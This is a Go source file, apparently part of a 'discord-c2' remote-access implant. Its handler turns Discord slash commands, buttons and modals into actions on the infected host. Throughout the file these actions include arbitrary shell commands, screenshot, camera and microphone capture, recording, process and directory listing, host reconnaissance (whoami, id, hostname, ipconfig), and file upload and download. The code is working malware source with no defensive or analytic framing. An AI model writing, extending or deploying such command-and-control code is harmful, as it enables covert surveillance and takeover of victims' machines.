package main

// This file contains the top-level Discord interaction handler that routes
// slash commands, buttons, and modals to feature-specific handlers.

import (
	"runtime"

	"discord-c2/actions"

	"github.com/bwmarrin/discordgo"
)

// handleInteraction dispatches incoming interactions to the appropriate
// slash-command, component, or modal handler for this device channel.
func handleInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if i.ChannelID != myChannelId {
		return
	}

	switch i.Type {
	case discordgo.InteractionApplicationCommand:
		data := i.ApplicationCommandData()
		switch data.Name {
		case "help":
			handleSlashHelp(s, i)
		case "cmd":
			handleSlashCmd(s, i, data)
		case "screenshot":
			handleSlashScreenshot(s, i)
		case "camera":
			handleSlashCamera(s, i)
		case "mic":
			handleSlashMic(s, i, data)
		case "record":
			handleSlashRecord(s, i, data)
		case "recordstop":
			handleSlashRecordStop(s, i)
		case "log":
			handleSlashLog(s, i, data)
		case "cwd":
			handleSlashCwd(s, i)
		case "ls":
			handleSlashLs(s, i, data)
		case "ps":
			handleSlashPs(s, i)
		case "pidinfo":
			handleSlashPidInfo(s, i, data)
		case "download":
			handleSlashDownload(s, i, data)
		case "upload":
			handleSlashUpload(s, i, data)
		case "restart":
			handleSlashRestart(s, i)
		default:
		}
	case discordgo.InteractionMessageComponent:
		data := i.MessageComponentData()
		switch data.CustomID {
		case "d2c_screenshot":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "📸 Capturing screenshots...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			actions.Screenshot(s, i.ChannelID, ref)
		case "d2c_run_cmd":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseModal,
				Data: &discordgo.InteractionResponseData{
					CustomID: "d2c_cmd_modal",
					Title:    "Run command",
					Components: []discordgo.MessageComponent{
						discordgo.ActionsRow{
							Components: []discordgo.MessageComponent{
								&discordgo.TextInput{
									CustomID:    "d2c_cmd_input",
									Label:       "Shell command",
									Style:       discordgo.TextInputShort,
									Placeholder: "whoami",
									Required:    true,
								},
							},
						},
					},
				},
			})
		case "d2c_ls":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseModal,
				Data: &discordgo.InteractionResponseData{
					CustomID: "d2c_ls_modal",
					Title:    "List directory",
					Components: []discordgo.MessageComponent{
						discordgo.ActionsRow{
							Components: []discordgo.MessageComponent{
								&discordgo.TextInput{
									CustomID:    "d2c_ls_input",
									Label:       "ls path",
									Style:       discordgo.TextInputShort,
									Placeholder: "/path",
									Value:       "ls ",
									Required:    true,
								},
							},
						},
					},
				},
			})
		case "d2c_q_cwd":
			cmd := "pwd"
			if runtime.GOOS == "windows" {
				cmd = "cd"
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmd + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			runCommandString(s, i.ChannelID, ref, cmd)
		case "d2c_q_whoami":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `whoami`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			runCommandString(s, i.ChannelID, ref, "whoami")
		case "d2c_q_id":
			cmd := "id"
			if runtime.GOOS == "windows" {
				cmd = "whoami /user"
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmd + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			runCommandString(s, i.ChannelID, ref, cmd)
		case "d2c_q_hostname":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `hostname`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			runCommandString(s, i.ChannelID, ref, "hostname")
		case "d2c_q_ip":
			cmd := "ip addr"
			if runtime.GOOS == "windows" {
				cmd = "ipconfig"
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmd + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			runCommandString(s, i.ChannelID, ref, cmd)
		default:
		}
	case discordgo.InteractionModalSubmit:
		data := i.ModalSubmitData()
		switch data.CustomID {
		case "d2c_cmd_modal":
			var cmdStr string
			for _, row := range data.Components {
				ar, ok := row.(discordgo.ActionsRow)
				if !ok {
					continue
				}
				for _, c := range ar.Components {
					if input, ok := c.(*discordgo.TextInput); ok && input.CustomID == "d2c_cmd_input" {
						cmdStr = input.Value
					}
				}
			}
			if cmdStr == "" {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "No command provided.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmdStr + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmdStr)
		case "d2c_ls_modal":
			var cmdStr string
			for _, row := range data.Components {
				ar, ok := row.(discordgo.ActionsRow)
				if !ok {
					continue
				}
				for _, c := range ar.Components {
					if input, ok := c.(*discordgo.TextInput); ok && input.CustomID == "d2c_ls_input" {
						cmdStr = input.Value
					}
				}
			}
			if cmdStr == "" {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "No command provided.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmdStr + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmdStr)
		default:
		}
	default:
	}
}
